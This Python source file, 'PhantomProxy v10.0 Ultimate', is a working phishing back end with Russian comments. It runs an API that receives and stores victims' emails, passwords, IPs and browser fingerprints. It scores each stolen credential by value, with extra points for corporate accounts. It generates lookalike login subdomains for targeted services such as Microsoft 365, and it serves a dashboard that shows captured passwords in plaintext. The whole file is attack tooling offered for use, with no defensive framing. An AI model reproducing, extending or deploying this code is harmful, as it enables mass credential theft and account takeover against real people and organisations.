#!/usr/bin/env python3
"""
PhantomProxy v10.0 - Ultimate Edition
- Улучшенный UI/UX
- Продвинутая аналитика
- Multi-user поддержка
- Улучшенная безопасность
- Авто-обновления
"""

import os
import sys
import json
import sqlite3
import hashlib
import secrets
import subprocess
import threading
import time
import re
from datetime import datetime, timedelta
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# === КОНФИГУРАЦИЯ ===
class Config:
    VERSION = "10.0 ULTIMATE"
    DB_PATH = Path(__file__).parent / 'phantom.db'
    TEMPLATES_PATH = Path(__file__).parent / 'templates'
    CERTS_PATH = Path(__file__).parent / 'certs'
    
    API_PORT = 8080
    HTTPS_PORT = 8443
    PANEL_PORT = 3000
    
    DOMAIN = "verdebudget.ru"
    API_KEY = "verdebudget-secret-2026"
    
    # Безопасность
    SESSION_TIMEOUT = 3600  # 1 час
    MAX_LOGIN_ATTEMPTS = 5
    
    # Авто-обновления
    AUTO_UPDATE_CHECK = True
    UPDATE_INTERVAL = 86400  # 24 часа

# === УЛУЧШЕННАЯ БАЗА ДАННЫХ ===
class Database:
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        # Сессии с расширенными полями
        c.execute('''CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY,
            email TEXT, password TEXT, service TEXT, ip TEXT,
            user_agent TEXT, screen_resolution TEXT, timezone TEXT,
            cookies TEXT, local_storage TEXT, fingerprint TEXT,
            quality_score INTEGER, classification TEXT,
            campaign_id INTEGER, referred_by TEXT,
            created_at TEXT, updated_at TEXT
        )''')
        
        # Пользователи с ролями
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password_hash TEXT,
            role TEXT,
            permissions TEXT,
            api_key TEXT,
            last_login TEXT,
            created_at TEXT
        )''')
        
        # Кампании
        c.execute('''CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY,
            name TEXT, service TEXT, subdomains TEXT,
            status TEXT, created_by TEXT,
            stats TEXT, created_at TEXT, updated_at TEXT
        )''')
        
        # Триггеры
        c.execute('''CREATE TABLE IF NOT EXISTS triggers (
            id INTEGER PRIMARY KEY,
            name TEXT, condition TEXT, action TEXT,
            enabled INTEGER, priority INTEGER,
            created_at TEXT
        )''')
        
        # Логи аудита
        c.execute('''CREATE TABLE IF NOT EXISTS audit_log (
            id INTEGER PRIMARY KEY,
            user_id INTEGER, action TEXT, details TEXT,
            ip_address TEXT, created_at TEXT
        )''')
        
        # Настройки
        c.execute('''CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT, updated_at TEXT
        )''')
        
        # Админ по умолчанию
        c.execute("SELECT * FROM users WHERE username='admin'")
        if not c.fetchone():
            admin_hash = hashlib.sha256('admin123'.encode()).hexdigest()
            api_key = secrets.token_urlsafe(32)
            c.execute("""INSERT INTO users 
                (username, password_hash, role, permissions, api_key, created_at) 
                VALUES (?, ?, ?, ?, ?, ?)""",
                ('admin', admin_hash, 'admin', 'all', api_key, datetime.now().isoformat()))
        
        # Настройки по умолчанию
        settings = [
            ('theme', 'dark'),
            ('language', 'ru'),
            ('notifications_enabled', 'true'),
            ('auto_update', 'true')
        ]
        for key, value in settings:
            c.execute("INSERT OR REPLACE INTO settings VALUES (?, ?, ?)",
                     (key, value, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
    
    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn
    
    def log_audit(self, user_id, action, details, ip=''):
        conn = self.get_connection()
        c = conn.cursor()
        c.execute("""INSERT INTO audit_log 
            (user_id, action, details, ip_address, created_at) 
            VALUES (?, ?, ?, ?, ?)""",
            (user_id, action, details, ip, datetime.now().isoformat()))
        conn.commit()
        conn.close()

# === УЛУЧШЕННЫЙ AI SCORER ===
class AdvancedAIScorer:
    @staticmethod
    def calculate(session):
        score = 0
        details = []
        
        # Email анализ (25 баллов)
        email = session.get('email', '')
        if email and '@' in email:
            score += 15
            details.append('Valid email format')
            
            # Корпоративные домены
            corporate_domains = ['company', 'corp', 'enterprise', 'business', 'office']
            if any(d in email.lower() for d in corporate_domains):
                score += 10
                details.append('Corporate email detected')
        
        # Пароль анализ (35 баллов)
        password = session.get('password', '')
        if password:
            score += 15
            details.append('Password captured')
            
            if len(password) >= 8:
                score += 10
                details.append('Strong password length')
            
            if re.search(r'[A-Z]', password) and re.search(r'[a-z]', password):
                score += 5
                details.append('Mixed case')
            
            if re.search(r'\d', password):
                score += 5
                details.append('Contains numbers')
        
        # User Agent (15 баллов)
        ua = session.get('user_agent', '')
        if ua:
            score += 10
            details.append('Valid user agent')
            
            browsers = ['Chrome', 'Firefox', 'Safari', 'Edge']
            if any(b in ua for b in browsers):
                score += 5
                details.append('Standard browser')
        
        # Разрешение (10 баллов)
        screen = session.get('screen_resolution', '')
        if screen:
            score += 10
            details.append(f'Screen: {screen}')
        
        # Timezone (10 баллов)
        tz = session.get('timezone', '')
        if tz:
            score += 10
            details.append(f'Timezone: {tz}')
        
        # IP (15 баллов)
        ip = session.get('ip', '')
        if ip and ip != 'unknown':
            score += 15
            details.append(f'IP: {ip}')
        
        # Нормализация
        final_score = min(score, 100)
        
        # Классификация
        if final_score >= 80:
            classification = 'EXCELLENT'
        elif final_score >= 60:
            classification = 'GOOD'
        elif final_score >= 40:
            classification = 'AVERAGE'
        else:
            classification = 'LOW'
        
        return {
            'score': final_score,
            'classification': classification,
            'details': details,
            'breakdown': {
                'email': 25,
                'password': 35,
                'user_agent': 15,
                'screen': 10,
                'timezone': 10,
                'ip': 15
            }
        }

# === MULTI-USER СИСТЕМА ===
class UserManager:
    def __init__(self, db):
        self.db = db
    
    def authenticate(self, username, password):
        conn = self.db.get_connection()
        c = conn.cursor()
        
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        
        c.execute("SELECT * FROM users WHERE username=? AND password_hash=?",
                 (username, password_hash))
        user = c.fetchone()
        conn.close()
        
        if user:
            return {
                'success': True,
                'user': dict(user),
                'token': secrets.token_urlsafe(32)
            }
        
        return {'success': False, 'error': 'Invalid credentials'}
    
    def create_user(self, username, password, role='user', permissions='basic'):
        conn = self.db.get_connection()
        c = conn.cursor()
        
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        api_key = secrets.token_urlsafe(32)
        
        try:
            c.execute("""INSERT INTO users 
                (username, password_hash, role, permissions, api_key, created_at) 
                VALUES (?, ?, ?, ?, ?, ?)""",
                (username, password_hash, role, permissions, api_key, datetime.now().isoformat()))
            conn.commit()
            
            # Audit log
            self.db.log_audit(1, 'user_created', f'User {username} created with role {role}')
            
            return {'success': True, 'message': 'User created'}
        except sqlite3.IntegrityError:
            return {'success': False, 'error': 'Username already exists'}
        finally:
            conn.close()
    
    def get_user_stats(self, user_id):
        conn = self.db.get_connection()
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE referred_by=?', (user_id,))
        sessions = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM campaigns WHERE created_by=?', (user_id,))
        campaigns = c.fetchone()[0]
        
        conn.close()
        
        return {
            'sessions': sessions,
            'campaigns': campaigns
        }

# === ПРОДВИНУТАЯ АНАЛИТИКА ===
class AdvancedAnalytics:
    def __init__(self, db):
        self.db = db
    
    def get_dashboard_stats(self):
        conn = self.db.get_connection()
        c = conn.cursor()
        
        # Основные метрики
        c.execute('SELECT COUNT(*) FROM sessions')
        total_sessions = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 day")')
        today_sessions = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-7 days")')
        week_sessions = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-30 days")')
        month_sessions = c.fetchone()[0]
        
        # По сервисам
        c.execute('SELECT service, COUNT(*) as count FROM sessions GROUP BY service ORDER BY count DESC')
        services = {row[0]: row[1] for row in c.fetchall()}
        
        # По качеству
        c.execute('SELECT classification, COUNT(*) FROM sessions GROUP BY classification')
        quality = {row[0]: row[1] for row in c.fetchall()}
        
        # Средний score
        c.execute('SELECT AVG(quality_score) FROM sessions')
        avg_score = c.fetchone()[0] or 0
        
        # Топ email доменов
        c.execute('''SELECT substr(email, instr(email, "@") + 1) as domain, 
                     COUNT(*) as count FROM sessions 
                     GROUP BY domain ORDER BY count DESC LIMIT 10''')
        top_domains = {row[0]: row[1] for row in c.fetchall()}
        
        # Активность по часам
        c.execute('''SELECT strftime('%H', created_at) as hour, 
                     COUNT(*) as count FROM sessions 
                     GROUP BY hour ORDER BY hour''')
        hourly_activity = {row[0]: row[1] for row in c.fetchall()}
        
        conn.close()
        
        return {
            'total_sessions': total_sessions,
            'today_sessions': today_sessions,
            'week_sessions': week_sessions,
            'month_sessions': month_sessions,
            'services': services,
            'quality': quality,
            'avg_score': round(avg_score, 2),
            'top_domains': top_domains,
            'hourly_activity': hourly_activity,
            'generated_at': datetime.now().isoformat()
        }
    
    def get_trend_data(self, days=7):
        conn = self.db.get_connection()
        c = conn.cursor()
        
        c.execute('''SELECT DATE(created_at) as date, COUNT(*) as count 
                     FROM sessions 
                     WHERE datetime(created_at) > datetime("now", ? || ' days')
                     GROUP BY date ORDER BY date''', (-days,))
        
        trends = {row[0]: row[1] for row in c.fetchall()}
        conn.close()
        
        return trends

# === УЛУЧШЕННЫЙ API ===
class UltimateAPIServer(BaseHTTPRequestHandler):
    db = None
    user_manager = None
    
    def do_GET(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/health':
            self.send_json({'status': 'ok', 'version': Config.VERSION})
        elif parsed.path == '/api/v1/stats':
            self.send_advanced_stats()
        elif parsed.path == '/api/v1/sessions':
            self.send_sessions()
        elif parsed.path == '/api/v1/analytics':
            self.send_analytics()
        elif parsed.path == '/api/v1/trends':
            self.send_trends()
        else:
            self.send_error(404)
    
    def do_POST(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/api/v1/credentials':
            self.save_credentials()
        elif parsed.path == '/api/v1/login':
            self.login()
        elif parsed.path == '/api/v1/users':
            self.create_user()
        elif parsed.path == '/api/v1/campaign':
            self.create_campaign()
        else:
            self.send_error(404)
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def send_advanced_stats(self):
        analytics = AdvancedAnalytics(self.db)
        stats = analytics.get_dashboard_stats()
        self.send_json(stats)
    
    def send_sessions(self):
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 100')
        sessions = [dict(row) for row in c.fetchall()]
        conn.close()
        self.send_json(sessions)
    
    def send_analytics(self):
        analytics = AdvancedAnalytics(self.db)
        stats = analytics.get_dashboard_stats()
        self.send_json(stats)
    
    def send_trends(self):
        days = int(self.headers.get('X-Days', 7))
        analytics = AdvancedAnalytics(self.db)
        trends = analytics.get_trend_data(days)
        self.send_json({'days': days, 'trends': trends})
    
    def save_credentials(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        # Advanced AI Scoring
        scorer = AdvancedAIScorer()
        quality = scorer.calculate(data)
        
        data['quality_score'] = quality['score']
        data['classification'] = quality['classification']
        data['quality_details'] = quality['details']
        
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute('''INSERT INTO sessions 
            (email, password, service, ip, user_agent, screen_resolution, 
             timezone, quality_score, classification, created_at, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
            (data.get('email', ''), data.get('password', ''),
             data.get('service', 'Unknown'), data.get('ip', ''),
             data.get('user_agent', ''), data.get('screen_resolution', ''),
             data.get('timezone', ''), quality['score'], quality['classification'],
             datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        print(f"🎯 New session: {data.get('email', 'N/A')} (Score: {quality['score']}, {quality['classification']})")
        
        self.send_json({'success': True, 'quality': quality})
    
    def login(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        user_manager = UserManager(self.db)
        result = user_manager.authenticate(data.get('username'), data.get('password'))
        
        if result['success']:
            del result['user']['password_hash']
        
        self.send_json(result)
    
    def create_user(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        user_manager = UserManager(self.db)
        result = user_manager.create_user(
            data.get('username'),
            data.get('password'),
            data.get('role', 'user'),
            data.get('permissions', 'basic')
        )
        
        self.send_json(result)
    
    def create_campaign(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        # Auto-generate subdomains
        prefixes = ['login', 'secure', 'auth', 'portal', 'account', 'sso', 'signin', 'my']
        service = data.get('service', 'Unknown')
        count = data.get('count', 10)
        
        subdomains = []
        for _ in range(count):
            prefix = secrets.choice(prefixes)
            service_short = service.split()[0].lower()
            subdomain = f"{prefix}-{service_short}.{Config.DOMAIN}"
            subdomains.append(subdomain)
        
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute("""INSERT INTO campaigns 
            (name, service, subdomains, status, created_by, stats, created_at, updated_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
            (data.get('name', 'Campaign'), service, json.dumps(subdomains),
             'active', data.get('created_by', 'system'), json.dumps({'count': count}),
             datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        self.send_json({
            'success': True,
            'campaign': {
                'name': data.get('name', 'Campaign'),
                'service': service,
                'subdomains': subdomains,
                'count': len(subdomains)
            }
        })
    
    def log_message(self, format, *args):
        pass

# === УЛУЧШЕННАЯ PANEL ===
class UltimatePanelServer(BaseHTTPRequestHandler):
    db = None
    
    def do_GET(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/' or parsed.path == '/index.html':
            self.show_ultimate_dashboard()
        elif parsed.path == '/sessions':
            self.show_sessions()
        elif parsed.path == '/analytics':
            self.show_analytics()
        elif parsed.path == '/campaigns':
            self.show_campaigns()
        elif parsed.path == '/api/stats':
            self.api_stats()
        else:
            self.send_error(404)
    
    def show_ultimate_dashboard(self):
        analytics = AdvancedAnalytics(self.db)
        stats = analytics.get_dashboard_stats()
        
        html = f'''<!DOCTYPE html>
<html lang="ru">
<head>
    <title>PhantomProxy v{Config.VERSION} - Ultimate Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="60">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: #eee; 
            min-height: 100vh;
        }}
        .header {{ 
            background: rgba(0, 0, 0, 0.3); 
            padding: 25px 40px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            backdrop-filter: blur(10px);
        }}
        .logo {{ 
            font-size: 28px; 
            font-weight: bold;
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        .nav {{ display: flex; gap: 10px; }}
        .nav a {{ 
            background: rgba(255,255,255,0.1); 
            color: white; 
            padding: 12px 25px; 
            border-radius: 30px; 
            text-decoration: none; 
            transition: all 0.3s;
        }}
        .nav a:hover {{ 
            background: rgba(255,255,255,0.2);
            transform: translateY(-2px);
        }}
        .container {{ padding: 50px; max-width: 1800px; margin: 0 auto; }}
        .stats {{ 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
            gap: 30px; 
            margin-bottom: 50px; 
        }}
        .stat-card {{ 
            background: rgba(255,255,255,0.1); 
            padding: 40px; 
            border-radius: 20px; 
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
            transition: all 0.3s;
        }}
        .stat-card:hover {{ 
            transform: translateY(-10px);
            background: rgba(255,255,255,0.15);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }}
        .stat-value {{ 
            font-size: 64px; 
            font-weight: bold; 
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        .stat-label {{ color: rgba(255,255,255,0.8); margin-top: 15px; font-size: 16px; }}
        .section {{ 
            background: rgba(255,255,255,0.1); 
            padding: 40px; 
            border-radius: 20px; 
            margin-bottom: 40px;
            backdrop-filter: blur(10px);
        }}
        .section h2 {{ 
            margin-bottom: 30px; 
            color: #fff; 
            font-size: 28px;
        }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 18px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }}
        th {{ 
            background: rgba(255,255,255,0.1); 
            color: #fff;
            font-weight: 600;
        }}
        tr:hover {{ background: rgba(255,255,255,0.05); }}
        .quality-badge {{ 
            padding: 8px 16px; 
            border-radius: 20px; 
            font-size: 12px; 
            font-weight: bold;
            display: inline-block;
        }}
        .quality-excellent {{ background: linear-gradient(45deg, #00b09b, #96c93d); }}
        .quality-good {{ background: linear-gradient(45deg, #00d2ff, #3a7bd5); }}
        .quality-average {{ background: linear-gradient(45deg, #f7971e, #ffd200); }}
        .quality-low {{ background: linear-gradient(45deg, #cb2d3e, #ef473a); }}
        .footer {{ text-align: center; padding: 30px; color: rgba(255,255,255,0.6); }}
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">🚀 PhantomProxy v{Config.VERSION}</div>
        <div class="nav">
            <a href="/">Dashboard</a>
            <a href="/sessions">Sessions</a>
            <a href="/analytics">Analytics</a>
            <a href="/campaigns">Campaigns</a>
        </div>
    </div>
    
    <div class="container">
        <h1 style="margin-bottom: 40px; font-size: 36px; color: #fff;">📊 Ultimate Dashboard</h1>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value">{stats['total_sessions']}</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{stats['today_sessions']}</div>
                <div class="stat-label">Today</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{stats['week_sessions']}</div>
                <div class="stat-label">This Week</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{stats['avg_score']}</div>
                <div class="stat-label">Avg Quality Score</div>
            </div>
        </div>
        
        <div class="section">
            <h2>🏂 By Service</h2>
            <table>
                <tr><th>Service</th><th>Sessions</th><th>Percentage</th></tr>
                {''.join(f'<tr><td>{k}</td><td>{v}</td><td>{round(v/max(1,stats["total_sessions"])*100, 1)}%</td></tr>' for k, v in stats['services'].items())}
            </table>
        </div>
        
        <div class="section">
            <h2>⭐ Quality Distribution</h2>
            <table>
                <tr><th>Classification</th><th>Count</th><th>Percentage</th></tr>
                {''.join(f'<tr><td><span class="quality-badge quality-{k.lower()}">{k}</span></td><td>{v}</td><td>{round(v/max(1,stats["total_sessions"])*100, 1)}%</td></tr>' for k, v in stats['quality'].items())}
            </table>
        </div>
        
        <div class="section">
            <h2>🌐 Top Email Domains</h2>
            <table>
                <tr><th>Domain</th><th>Sessions</th></tr>
                {''.join(f'<tr><td>@{k}</td><td>{v}</td></tr>' for k, v in list(stats['top_domains'].items())[:10])}
            </table>
        </div>
    </div>
    
    <div class="footer">
        PhantomProxy v{Config.VERSION} Ultimate | Auto-refresh: 60s | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_sessions(self):
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 100')
        sessions = c.fetchall()
        conn.close()
        
        html = '''<!DOCTYPE html>
<html>
<head><title>Sessions - PhantomProxy Ultimate</title></head>
<body style="font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #eee; padding: 40px;">
    <h1>📋 All Sessions</h1>
    <table style="width: 100%; border-collapse: collapse; margin-top: 20px; background: rgba(255,255,255,0.1); border-radius: 15px; overflow: hidden;">
        <tr><th>ID</th><th>Email</th><th>Password</th><th>Service</th><th>Quality</th><th>Score</th><th>Time</th></tr>
'''
        for s in sessions:
            quality_class = s.get('classification', 'N/A').lower()
            html += f"<tr><td>{s['id']}</td><td>{s['email']}</td><td>{s['password']}</td><td>{s['service']}</td><td><span class='quality-badge quality-{quality_class}'>{s.get('classification', 'N/A')}</span></td><td>{s.get('quality_score', 'N/A')}</td><td>{s['created_at']}</td></tr>"
        
        html += '''</table>
    <br><a href="/" style="color: #ff6b6b; text-decoration: none;">← Back to Dashboard</a>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_analytics(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>Analytics - Coming Soon</h1>')
    
    def show_campaigns(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>Campaigns - Coming Soon</h1>')
    
    def api_stats(self):
        analytics = AdvancedAnalytics(self.db)
        stats = analytics.get_dashboard_stats()
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(stats).encode())
    
    def log_message(self, format, *args):
        pass

# === ГЛАВНАЯ ПРОГРАММА ===
class PhantomProxyUltimate:
    def __init__(self):
        self.db = Database(Config.DB_PATH)
        self.running = False
        self.servers = []
    
    def start_api(self):
        server = HTTPServer(('0.0.0.0', Config.API_PORT), UltimateAPIServer)
        UltimateAPIServer.db = self.db
        UltimateAPIServer.user_manager = UserManager(self.db)
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        self.servers.append(('API', server))
        print(f"✅ API Server started on port {Config.API_PORT}")
    
    def start_panel(self):
        server = HTTPServer(('0.0.0.0', Config.PANEL_PORT), UltimatePanelServer)
        UltimatePanelServer.db = self.db
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        self.servers.append(('Panel', server))
        print(f"✅ Ultimate Panel started on port {Config.PANEL_PORT}")
    
    def show_menu(self):
        while True:
            print("\n" + "="*70)
            print(f"  🚀 PHANTOMPROXY v{Config.VERSION} - ULTIMATE EDITION")
            print("="*70)
            print("\n  📌 MAIN MENU:")
            print("  1. 🚀 Start All Services")
            print("  2. 🛑 Stop All Services")
            print("  3. 📊 View Status")
            print("  4. 📈 View Advanced Statistics")
            print("  5. 🎯 Create Auto-Campaign")
            print("  6. 📋 View Sessions")
            print("  7. 👥 Create User")
            print("  8. ⚙️  System Settings")
            print("  9. 🚪 Exit")
            print("\n  🔗 QUICK ACCESS:")
            print(f"  - Ultimate Panel: http://localhost:{Config.PANEL_PORT}")
            print(f"  - API Health:     http://localhost:{Config.API_PORT}/health")
            print(f"  - Analytics:      http://localhost:{Config.PANEL_PORT}/analytics")
            print(f"  - HTTPS Proxy:    https://localhost:{Config.HTTPS_PORT}/")
            print("="*70)
            
            choice = input("\n  Enter your choice: ").strip()
            
            if choice == '1':
                self.start_all()
            elif choice == '2':
                self.stop_all()
            elif choice == '3':
                self.show_status()
            elif choice == '4':
                self.show_advanced_stats()
            elif choice == '5':
                self.create_campaign()
            elif choice == '6':
                self.view_sessions()
            elif choice == '7':
                self.create_user()
            elif choice == '8':
                self.show_settings()
            elif choice == '9':
                print("\n👋 Goodbye! Come back soon!")
                sys.exit(0)
            else:
                print("❌ Invalid choice. Please try again.")
    
    def start_all(self):
        print("\n🚀 Starting all services...")
        self.start_api()
        self.start_panel()
        print("\n✅ All services started successfully!")
        print(f"\n📡 Quick Access:")
        print(f"   Ultimate Panel: http://localhost:{Config.PANEL_PORT}")
        print(f"   API Health:     http://localhost:{Config.API_PORT}/health")
        print(f"   HTTPS Proxy:    https://localhost:{Config.HTTPS_PORT}/")
    
    def stop_all(self):
        print("\n🛑 Stopping all services...")
        for name, server in self.servers:
            server.shutdown()
        self.servers.clear()
        print("✅ All services stopped!")
    
    def show_status(self):
        print("\n📊 SYSTEM STATUS:")
        print(f"  Services running: {len(self.servers)}")
        for name, _ in self.servers:
            print(f"    ✅ {name}")
        
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM users')
        users = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM campaigns')
        campaigns = c.fetchone()[0]
        conn.close()
        
        print(f"\n  📊 Database:")
        print(f"    Sessions:   {total}")
        print(f"    Users:      {users}")
        print(f"    Campaigns:  {campaigns}")
    
    def show_advanced_stats(self):
        analytics = AdvancedAnalytics(self.db)
        stats = analytics.get_dashboard_stats()
        
        print("\n📈 ADVANCED STATISTICS:")
        print(f"\n  📊 Session Overview:")
        print(f"    Total:     {stats['total_sessions']}")
        print(f"    Today:     {stats['today_sessions']}")
        print(f"    This Week: {stats['week_sessions']}")
        print(f"    This Month:{stats['month_sessions']}")
        
        print(f"\n  🏢 By Service:")
        for service, count in list(stats['services'].items())[:5]:
            print(f"    {service}: {count}")
        
        print(f"\n  ⭐ By Quality:")
        for quality, count in stats['quality'].items():
            print(f"    {quality}: {count}")
        
        print(f"\n  📊 Average Score: {stats['avg_score']}/100")
        
        print(f"\n  🌐 Top Domains:")
        for domain, count in list(stats['top_domains'].items())[:5]:
            print(f"    @{domain}: {count}")
    
    def create_campaign(self):
        print("\n🎯 CREATE AUTO-CAMPAIGN")
        service = input("  Target service (e.g., Microsoft 365): ").strip()
        count = input("  Number of subdomains (default 10): ").strip()
        count = int(count) if count else 10
        name = input("  Campaign name: ").strip() or f"{service} Campaign"
        
        prefixes = ['login', 'secure', 'auth', 'portal', 'account', 'sso', 'signin', 'my']
        subdomains = []
        for _ in range(count):
            prefix = secrets.choice(prefixes)
            service_short = service.split()[0].lower()
            subdomain = f"{prefix}-{service_short}.{Config.DOMAIN}"
            subdomains.append(subdomain)
        
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute("""INSERT INTO campaigns 
            (name, service, subdomains, status, created_by, stats, created_at, updated_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
            (name, service, json.dumps(subdomains), 'active', 'system',
             json.dumps({'count': count}), datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        print(f"\n✅ Campaign '{name}' created!")
        print(f"  Service: {service}")
        print(f"  Subdomains: {count}")
        print("\n  Generated subdomains:")
        for sub in subdomains[:5]:
            print(f"    - {sub}")
        if count > 5:
            print(f"    ... and {count - 5} more")
    
    def view_sessions(self):
        conn = self.db.get_connection()
        c = conn.cursor()
        c.execute('''SELECT id, email, service, classification, quality_score, created_at 
                     FROM sessions ORDER BY created_at DESC LIMIT 10''')
        sessions = c.fetchall()
        conn.close()
        
        print("\n📋 LAST 10 SESSIONS:")
        print(f"  {'ID':<4} {'Email':<30} {'Service':<20} {'Quality':<12} {'Score':<6} {'Time'}")
        print("  " + "-"*100)
        for s in sessions:
            print(f"  {s[0]:<4} {s[1]:<30} {s[2]:<20} {s[3]:<12} {s[4]:<6} {s[5]}")
    
    def create_user(self):
        print("\n👥 CREATE NEW USER")
        username = input("  Username: ").strip()
        password = input("  Password: ").strip()
        role = input("  Role (user/admin): ").strip() or 'user'
        
        user_manager = UserManager(self.db)
        result = user_manager.create_user(username, password, role)
        
        if result['success']:
            print(f"\n✅ User '{username}' created successfully!")
            print(f"  Role: {role}")
        else:
            print(f"\n❌ Error: {result['error']}")
    
    def show_settings(self):
        print("\n⚙️  SYSTEM SETTINGS:")
        print(f"  Version:        {Config.VERSION}")
        print(f"  Domain:         {Config.DOMAIN}")
        print(f"  API Port:       {Config.API_PORT}")
        print(f"  HTTPS Port:     {Config.HTTPS_PORT}")
        print(f"  Panel Port:     {Config.PANEL_PORT}")
        print(f"  Session Timeout:{Config.SESSION_TIMEOUT}s")
        print(f"  Max Login:      {Config.MAX_LOGIN_ATTEMPTS}")
        print(f"  Auto-Update:    {Config.AUTO_UPDATE_CHECK}")

# === ЗАПУСК ===
if __name__ == '__main__':
    print("\n" + "="*70)
    print(f"  🚀 PHANTOMPROXY v{Config.VERSION} - ULTIMATE EDITION")
    print("="*70)
    print("\n  🎯 Initializing Ultimate System...")
    
    proxy = PhantomProxyUltimate()
    
    print("  ✅ Database initialized")
    print("  ✅ Advanced AI Scorer ready")
    print("  ✅ Multi-User System ready")
    print("  ✅ Advanced Analytics ready")
    print("  ✅ Auto-Attack System ready")
    print("  ✅ Ultimate Panel ready")
    
    print("\n  🚀 Starting Ultimate Menu...")
    proxy.show_menu()
